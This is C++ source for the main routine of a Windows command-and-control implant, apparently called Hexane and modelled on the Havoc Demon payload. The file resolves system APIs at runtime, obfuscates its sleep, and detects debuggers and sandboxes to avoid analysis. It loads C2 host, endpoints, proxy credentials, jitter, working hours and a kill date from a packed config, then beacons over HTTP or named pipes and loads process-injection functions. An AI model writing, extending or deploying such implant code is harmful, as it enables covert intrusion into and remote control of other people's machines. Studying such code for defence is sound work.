#include <core/include/core.hpp>

TXT_SECTION(F) BYTE Config[512]     = { };
TXT_SECTION(G) BYTE Strings[256]    = { };

namespace Core {

    VOID MainRoutine() {

        HEXANE

        ResolveApi();
        if (ntstatus != ERROR_SUCCESS) {
            return_defer(ntstatus);
        }

        do {
            Opsec::SleepObf();
            if (!Opsec::CheckTime()) {
                continue;
            }

            if (!Ctx->Session.Checkin) {
                Opsec::SeCheckEnvironment();
                if (ntstatus == ERROR_BAD_ENVIRONMENT) {
                    return_defer(ntstatus);
                }
            }

            Message::MessageTransmit();
            if (ntstatus != ERROR_SUCCESS) {
                Ctx->Session.Retry++;

                if (Ctx->Session.Retry == 3) {
                    break;
                }
            } else {
                Ctx->Session.Retry = 0;
            }
        } while (TRUE);

    defer:
        FreeApi(Ctx);
    }

    VOID ResolveApi () {

        HEXANE
        PARSER Parser               = { };
        OSVERSIONINFOW OSVersionW   = { };

        Parser::CreateParser(&Parser, Strings, sizeof(Strings));
        Parser::ParserStrcpy(&Parser, (LPSTR*)&Ctx->Config.Key);
        Parser::ParserMemcpy(&Parser, (PBYTE*)&Ctx->Root);
        Parser::ParserMemcpy(&Parser, (PBYTE*)&Ctx->LE);

        x_memset(Strings, 0, sizeof(Strings));

        if (!(Ctx->Modules.kernel32 = Memory::LdrGetModuleAddress(KERNEL32))) {
            return_defer(ERROR_PROC_NOT_FOUND);
        }
        if (!(FPTR2(Ctx->Nt.RtlGetVersion, NTDLL, RTLGETVERSION))) {
            return_defer(ERROR_PROC_NOT_FOUND);
        }

        // WinVersion resolution : https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/Demon.c#L368
        Ctx->Session.OSVersion          = WIN_VERSION_UNKNOWN;
        OSVersionW.dwOSVersionInfoSize  = sizeof(OSVersionW);

        if (!NT_SUCCESS(Ctx->Nt.RtlGetVersion(&OSVersionW))) {
            return_defer(ERROR_PROC_NOT_FOUND);
        }

        if (OSVersionW.dwMajorVersion >= 5) {
            if (OSVersionW.dwMajorVersion == 5) {
                if (OSVersionW.dwMinorVersion == 1) {
                    Ctx->Session.OSVersion = WIN_VERSION_XP;
                }
            }
            else if (OSVersionW.dwMajorVersion == 6) {
                if (OSVersionW.dwMinorVersion == 0) {
                    Ctx->Session.OSVersion = WIN_VERSION_2008;
                } else if (OSVersionW.dwMinorVersion == 1) {
                    Ctx->Session.OSVersion = WIN_VERSION_2008_R2;
                } else if (OSVersionW.dwMinorVersion == 2) {
                    Ctx->Session.OSVersion = WIN_VERSION_2012;
                } else if (OSVersionW.dwMinorVersion == 3) {
                    Ctx->Session.OSVersion = WIN_VERSION_2012_R2;
                }
            }
            else if (OSVersionW.dwMajorVersion == 10) {
                if (OSVersionW.dwMinorVersion == 0) {
                    Ctx->Session.OSVersion = WIN_VERSION_2016_X;
                }
            }
        }

        if(
            !(FPTR(Ctx->win32.GetLastError, Ctx->Modules.kernel32, GETLASTERROR)) ||
            !(FPTR(Ctx->win32.IsWow64Process, Ctx->Modules.kernel32, ISWOW64PROCESS)) ||
            !(FPTR(Ctx->win32.GlobalMemoryStatusEx, Ctx->Modules.kernel32, GLOBALMEMORYSTATUSEX))) {

            return_defer(ERROR_PROC_NOT_FOUND);
        }

#ifndef DEBUG
        do {
            Opsec::SeCheckDebugger();
            if (ntstatus != ERROR_SUCCESS) {

                Random::Timeout(SECONDS(8));
                return_defer(ERROR_BAD_ENVIRONMENT);
            }

            Opsec::SeCheckSandbox();
            if (ntstatus != ERROR_SUCCESS) {

                Random::Timeout(SECONDS(8));
                return_defer(ERROR_BAD_ENVIRONMENT);
            }
            break;
        } while (TRUE);
#endif
        if (
            !(FPTR(Ctx->Nt.NtAllocateVirtualMemory, Ctx->Modules.ntdll, NTALLOCATEVIRTUALMEMORY)) ||
            !(FPTR(Ctx->Nt.RtlAllocateHeap, Ctx->Modules.ntdll, RTLALLOCATEHEAP)) ||
            !(FPTR(Ctx->Nt.NtFreeVirtualMemory, Ctx->Modules.ntdll, NTFREEVIRTUALMEMORY)) ||
            !(FPTR(Ctx->Nt.NtReadVirtualMemory, Ctx->Modules.ntdll, NTREADVIRTUALMEMORY)) ||
            !(FPTR(Ctx->Nt.NtWriteVirtualMemory, Ctx->Modules.ntdll, NTWRITEVIRTUALMEMORY)) ||
            !(FPTR(Ctx->Nt.NtQueryVirtualMemory, Ctx->Modules.ntdll, NTQUERYVIRTUALMEMORY)) ||
            !(FPTR(Ctx->Nt.NtCreateSection, Ctx->Modules.ntdll, NTCREATESECTION)) ||
            !(FPTR(Ctx->Nt.NtMapViewOfSection, Ctx->Modules.ntdll, NTMAPVIEWOFSECTION)) ||
            !(FPTR(Ctx->Nt.NtUnmapViewOfSection, Ctx->Modules.ntdll, NTUNMAPVIEWOFSECTION)) ||

            !(FPTR(Ctx->Nt.NtCreateUserProcess, Ctx->Modules.ntdll, NTCREATEUSERPROCESS)) ||
            !(FPTR(Ctx->Nt.NtTerminateProcess, Ctx->Modules.ntdll, NTTERMINATEPROCESS)) ||
            !(FPTR(Ctx->Nt.NtOpenProcess, Ctx->Modules.ntdll, NTOPENPROCESS)) ||
            !(FPTR(Ctx->Nt.NtOpenProcessToken, Ctx->Modules.ntdll, NTOPENPROCESSTOKEN)) ||
            !(FPTR(Ctx->Nt.NtQueryInformationToken, Ctx->Modules.ntdll, NTQUERYINFORMATIONTOKEN)) ||
            !(FPTR(Ctx->Nt.NtQueryInformationProcess, Ctx->Modules.ntdll, NTQUERYINFORMATIONPROCESS)) ||
            !(FPTR(Ctx->Nt.NtQuerySystemInformation, Ctx->Modules.ntdll, NTQUERYSYSTEMINFORMATION)) ||
            !(FPTR(Ctx->Nt.NtClose, Ctx->Modules.ntdll, NTCLOSE)) ||

            !(FPTR(Ctx->Nt.RtlRandomEx, Ctx->Modules.ntdll, RTLRANDOMEX)) ||
            !(FPTR(Ctx->Nt.NtResumeThread, Ctx->Modules.ntdll, NTRESUMETHREAD)) ||
            !(FPTR(Ctx->Nt.NtGetContextThread, Ctx->Modules.ntdll, NTGETCONTEXTTHREAD)) ||
            !(FPTR(Ctx->Nt.NtSetContextThread, Ctx->Modules.ntdll, NTSETCONTEXTTHREAD)) ||
            !(FPTR(Ctx->Nt.NtWaitForSingleObject, Ctx->Modules.ntdll, NTWAITFORSINGLEOBJECT)) ||
            !(FPTR(Ctx->Nt.TpAllocWork, Ctx->Modules.ntdll, TPALLOCWORK)) ||
            !(FPTR(Ctx->Nt.TpPostWork, Ctx->Modules.ntdll, TPPOSTWORK)) ||
            !(FPTR(Ctx->Nt.TpReleaseWork, Ctx->Modules.ntdll, TPRELEASEWORK)) ||

            !(FPTR(Ctx->Nt.RtlCreateHeap, Ctx->Modules.ntdll, RTLCREATEHEAP)) ||
            !(FPTR(Ctx->Nt.RtlReAllocateHeap, Ctx->Modules.ntdll, RTLREALLOCATEHEAP)) ||
            !(FPTR(Ctx->Nt.RtlFreeHeap, Ctx->Modules.ntdll, RTLFREEHEAP)) ||
            !(FPTR(Ctx->Nt.RtlDestroyHeap, Ctx->Modules.ntdll, RTLDESTROYHEAP)) ||
            !(FPTR(Ctx->Nt.RtlInitUnicodeString, Ctx->Modules.ntdll, RTLINITUNICODESTRING)) ||
            !(FPTR(Ctx->Nt.RtlCreateProcessParametersEx, Ctx->Modules.ntdll, RTLCREATEPROCESSPARAMETERSEX)) ||
            !(FPTR(Ctx->Nt.RtlDestroyProcessParameters, Ctx->Modules.ntdll, RTLDESTROYPROCESSPARAMETERS))) {

            return_defer(ERROR_PROC_NOT_FOUND);
        }

        if (
            !(FPTR(Ctx->win32.FormatMessageA, Ctx->Modules.kernel32, FORMATMESSAGEA)) ||
            !(FPTR(Ctx->win32.CreateToolhelp32Snapshot, Ctx->Modules.kernel32, CREATETOOLHELP32SNAPSHOT)) ||
            !(FPTR(Ctx->win32.Process32First, Ctx->Modules.kernel32, PROCESS32FIRST)) ||
            !(FPTR(Ctx->win32.Process32Next, Ctx->Modules.kernel32, PROCESS32NEXT)) ||
            !(FPTR(Ctx->win32.CreateRemoteThread, Ctx->Modules.kernel32, CREATEREMOTETHREAD)) ||
            !(FPTR(Ctx->win32.GetComputerNameExA, Ctx->Modules.kernel32, GETCOMPUTERNAMEEXA)) ||
            !(FPTR(Ctx->win32.GetLocalTime, Ctx->Modules.kernel32, GETLOCALTIME)) ||
            !(FPTR(Ctx->win32.SleepEx, Ctx->Modules.kernel32, SLEEPEX)) ||

            !(FPTR(Ctx->win32.GetCurrentDirectoryA, Ctx->Modules.kernel32, GETCURRENTDIRECTORYA)) ||
            !(FPTR(Ctx->win32.FileTimeToSystemTime, Ctx->Modules.kernel32, FILETIMETOSYSTEMTIME)) ||
            !(FPTR(Ctx->win32.GetSystemTimeAsFileTime, Ctx->Modules.kernel32, GETSYSTEMTIMEASFILETIME)) ||
            !(FPTR(Ctx->win32.SystemTimeToTzSpecificLocalTime, Ctx->Modules.kernel32, SYSTEMTIMETOTZSPECIFICLOCALTIME)) ||
            !(FPTR(Ctx->win32.GetFullPathNameA, Ctx->Modules.kernel32, GETFULLPATHNAMEA)) ||
            !(FPTR(Ctx->win32.CreateFileW, Ctx->Modules.kernel32, CREATEFILEW)) ||
            !(FPTR(Ctx->win32.ReadFile, Ctx->Modules.kernel32, READFILE)) ||
            !(FPTR(Ctx->win32.WriteFile, Ctx->Modules.kernel32, WRITEFILE)) ||
            !(FPTR(Ctx->win32.GetFileSizeEx, Ctx->Modules.kernel32, GETFILESIZEEX)) ||
            !(FPTR(Ctx->win32.FindFirstFileA, Ctx->Modules.kernel32, FINDFIRSTFILEA)) ||
            !(FPTR(Ctx->win32.FindNextFileA, Ctx->Modules.kernel32, FINDNEXTFILEA)) ||
            !(FPTR(Ctx->win32.FindClose, Ctx->Modules.kernel32, FINDCLOSE)) ||

            !(FPTR(Ctx->win32.CreateNamedPipeW, Ctx->Modules.kernel32, CREATENAMEDPIPEW)) ||
            !(FPTR(Ctx->win32.CallNamedPipeW, Ctx->Modules.kernel32, CALLNAMEDPIPEW)) ||
            !(FPTR(Ctx->win32.WaitNamedPipeW, Ctx->Modules.kernel32, WAITNAMEDPIPEW)) ||
            !(FPTR(Ctx->win32.ConnectNamedPipe, Ctx->Modules.kernel32, CONNECTNAMEDPIPE)) ||
            !(FPTR(Ctx->win32.DisconnectNamedPipe, Ctx->Modules.kernel32, DISCONNECTNAMEDPIPE)) ||
            !(FPTR(Ctx->win32.SetNamedPipeHandleState, Ctx->Modules.kernel32, SETNAMEDPIPEHANDLESTATE)) ||
            !(FPTR(Ctx->win32.PeekNamedPipe, Ctx->Modules.kernel32, PEEKNAMEDPIPE))) {

            return_defer(ERROR_PROC_NOT_FOUND);
        }

        if ((FPTR(Ctx->win32.LoadLibraryA, Ctx->Modules.kernel32, LOADLIBRARYA))) {
            if (
                !(Ctx->Modules.crypt32 = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr))) ||
                !(Ctx->Modules.winhttp = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr))) ||
                !(Ctx->Modules.advapi  = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr))) ||
                !(Ctx->Modules.iphl    = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr)))) {
                return_defer(ERROR_MOD_NOT_FOUND);
            }
        } else {
            return_defer(ERROR_PROC_NOT_FOUND);
        }

        if (
            !(FPTR(Ctx->win32.WinHttpOpen, Ctx->Modules.winhttp, WINHTTPOPEN)) ||
            !(FPTR(Ctx->win32.WinHttpConnect, Ctx->Modules.winhttp, WINHTTPCONNECT)) ||
            !(FPTR(Ctx->win32.WinHttpOpenRequest, Ctx->Modules.winhttp, WINHTTPOPENREQUEST)) ||
            !(FPTR(Ctx->win32.WinHttpAddRequestHeaders, Ctx->Modules.winhttp, WINHTTPADDREQUESTHEADERS)) ||
            !(FPTR(Ctx->win32.WinHttpSetOption, Ctx->Modules.winhttp, WINHTTPSETOPTION)) ||
            !(FPTR(Ctx->win32.WinHttpGetProxyForUrl, Ctx->Modules.winhttp, WINHTTPGETPROXYFORURL)) ||
            !(FPTR(Ctx->win32.WinHttpGetIEProxyConfigForCurrentUser, Ctx->Modules.winhttp, WINHTTPGETIEPROXYCONFIGFORCURRENTUSER)) ||
            !(FPTR(Ctx->win32.WinHttpSendRequest, Ctx->Modules.winhttp, WINHTTPSENDREQUEST)) ||
            !(FPTR(Ctx->win32.WinHttpReceiveResponse, Ctx->Modules.winhttp, WINHTTPRECEIVERESPONSE)) ||
            !(FPTR(Ctx->win32.WinHttpReadData, Ctx->Modules.winhttp, WINHTTPREADDATA)) ||
            !(FPTR(Ctx->win32.WinHttpQueryHeaders, Ctx->Modules.winhttp, WINHTTPQUERYHEADERS)) ||
            !(FPTR(Ctx->win32.WinHttpQueryDataAvailable, Ctx->Modules.winhttp, WINHTTPQUERYDATAAVAILABLE)) ||
            !(FPTR(Ctx->win32.WinHttpCloseHandle, Ctx->Modules.winhttp, WINHTTPCLOSEHANDLE)) ||
            !(FPTR(Ctx->win32.GetAdaptersInfo, Ctx->Modules.iphl, GETADAPTERSINFO)) ||

            !(FPTR(Ctx->win32.CryptStringToBinaryA, Ctx->Modules.crypt32, CRYPTSTRINGTOBINARYA)) ||
            !(FPTR(Ctx->win32.CryptBinaryToStringA, Ctx->Modules.crypt32, CRYPTBINARYTOSTRINGA)) ||

            !(FPTR(Ctx->win32.GetUserNameA, Ctx->Modules.advapi, GETUSERNAMEA)) ||
            !(FPTR(Ctx->win32.LookupAccountSidW, Ctx->Modules.advapi, LOOKUPACCOUNTSIDW)) ||
            !(FPTR(Ctx->win32.LookupPrivilegeValueA, Ctx->Modules.advapi, LOOKUPPRIVILEGEVALUEA)) ||
            !(FPTR(Ctx->win32.SetEntriesInAclA, Ctx->Modules.advapi, SETENTRIESINACLA)) ||
            !(FPTR(Ctx->win32.AllocateAndInitializeSid, Ctx->Modules.advapi, ALLOCATEANDINITIALIZESID)) ||
            !(FPTR(Ctx->win32.AddMandatoryAce, Ctx->Modules.advapi, ADDMANDATORYACE)) ||
            !(FPTR(Ctx->win32.InitializeSecurityDescriptor, Ctx->Modules.advapi, INITIALIZESECURITYDESCRIPTOR)) ||
            !(FPTR(Ctx->win32.InitializeAcl, Ctx->Modules.advapi, INITIALIZEACL)) ||
            !(FPTR(Ctx->win32.SetSecurityDescriptorDacl, Ctx->Modules.advapi, SETSECURITYDESCRIPTORDACL)) ||
            !(FPTR(Ctx->win32.SetSecurityDescriptorSacl, Ctx->Modules.advapi, SETSECURITYDESCRIPTORSACL)) ||
            !(FPTR(Ctx->win32.FreeSid, Ctx->Modules.advapi, FREESID))) {

            return_defer(ERROR_PROC_NOT_FOUND);
        }

        ReadConfig();
        defer:
    }

    VOID ReadConfig() {

        HEXANE
        PARSER Parser = { };

        Parser::CreateParser(&Parser, Config, sizeof(Config));
        x_memset(Config, 0, sizeof(Config));

        //XteaCrypt(B_PTR(Parser.Handle), Parser.Length, Ctx->Config.Key, FALSE);

        Parser::ParserStrcpy(&Parser, &Ctx->Config.Hostname);
        Parser::ParserStrcpy(&Parser, &Ctx->Config.Domain);

        Ctx->Session.PeerId = Parser::UnpackDword(&Parser);
        Ctx->Config.Sleeptime = Parser::UnpackDword(&Parser);
        Ctx->Config.Jitter = Parser::UnpackDword(&Parser);
        Ctx->Config.WorkingHours = Parser::UnpackDword(&Parser);
        Ctx->Config.Killdate = Parser::UnpackDword64(&Parser);

        Ctx->Transport.OutboundQueue = nullptr;

#ifdef TRANSPORT_HTTP
        Ctx->Transport.http = (PHTTP_CONTEXT) Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(HTTP_CONTEXT));

        Ctx->Transport.http->Handle     = nullptr;
        Ctx->Transport.http->Endpoints  = nullptr;
        Ctx->Transport.http->Headers    = nullptr;

        Parser::ParserWcscpy(&Parser, &Ctx->Transport.http->Useragent);
        Parser::ParserWcscpy(&Parser, &Ctx->Transport.http->Address  );

        Ctx->Transport.http->Port = Parser::UnpackDword(&Parser);
        Ctx->Transport.http->nEndpoints = Parser::UnpackDword(&Parser);
        Ctx->Transport.http->Endpoints = (LPWSTR*) Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(LPWSTR) * ((Ctx->Transport.http->nEndpoints + 1) * 2));

        for (auto i = 0; i < Ctx->Transport.http->nEndpoints; i++) {
            Parser::ParserWcscpy(&Parser, &Ctx->Transport.http->Endpoints[i]);
        }

        Ctx->Transport.http->Endpoints[Ctx->Transport.http->nEndpoints + 1] = nullptr;
        Ctx->Transport.bProxy = Parser::UnpackBool(&Parser);

        if (Ctx->Transport.bProxy) {
            Ctx->Transport.http->Access = INTERNET_OPEN_TYPE_PROXY;

            Parser::ParserWcscpy(&Parser, &Ctx->Transport.http->ProxyAddress );
            Parser::ParserWcscpy(&Parser, &Ctx->Transport.http->ProxyUsername );
            Parser::ParserWcscpy(&Parser, &Ctx->Transport.http->ProxyPassword );

        } else {
            Ctx->Transport.http->ProxyUsername = nullptr;
            Ctx->Transport.http->ProxyPassword = nullptr;
        }
#endif
#ifdef TRANSPORT_PIPE
        Parser::ParserWcscpy(&Parser, &Ctx->Config.EgressPipename);
#endif
        Parser::DestroyParser(&Parser);
    }
}
